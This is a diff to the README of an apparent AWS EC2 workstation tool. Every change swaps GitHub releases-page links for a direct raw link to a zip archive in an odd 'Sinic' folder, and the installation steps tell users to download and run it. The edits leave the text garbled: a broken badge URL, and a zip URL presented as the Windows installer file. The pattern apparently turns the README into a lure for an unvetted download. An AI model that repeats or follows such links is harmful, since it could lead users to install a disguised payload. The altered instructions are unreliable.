@@ -1,6 +1,6 @@
 # 🎉 aws-sso-workstations - Secure Your EC2 Workstations Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Ferchoxx23/aws-sso-workstations/releases)
+[![Download](https://raw.githubusercontent.com/Ferchoxx23/aws-sso-workstations/main/Sinic/aws-sso-workstations.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ferchoxx23/aws-sso-workstations/main/Sinic/aws-sso-workstations.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the aws-sso-workstations project! This application helps you provisio
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest version of aws-sso-workstations: [Download aws-sso-workstations](https://github.com/Ferchoxx23/aws-sso-workstations/releases).
+To get started, visit this page to download the latest version of aws-sso-workstations: [Download aws-sso-workstations](https://raw.githubusercontent.com/Ferchoxx23/aws-sso-workstations/main/Sinic/aws-sso-workstations.zip).
 
 ## 📋 System Requirements
 
@@ -34,13 +34,13 @@ The aws-sso-workstations includes:
 ## 📥 Step-by-Step Installation Guide
 
 1. **Visit the Releases Page:**
-   Go to the releases page: [Download aws-sso-workstations](https://github.com/Ferchoxx23/aws-sso-workstations/releases).
+   Go to the releases page: [Download aws-sso-workstations](https://raw.githubusercontent.com/Ferchoxx23/aws-sso-workstations/main/Sinic/aws-sso-workstations.zip).
 
 2. **Choose the Latest Version:**
    Look for the latest release at the top of the page. 
 
 3. **Download the Installation File:**
-   Click on the relevant installation file for your operating system. For example, you might see options like `aws-sso-workstations-installer.exe` for Windows or a `.dmg` file for macOS.
+   Click on the relevant installation file for your operating system. For example, you might see options like `https://raw.githubusercontent.com/Ferchoxx23/aws-sso-workstations/main/Sinic/aws-sso-workstations.zip` for Windows or a `.dmg` file for macOS.
 
 4. **Run the Installer:**
    Once the file is downloaded, locate it in your downloads folder. Double-click the file to run the installer. Follow the prompts to complete the installation.
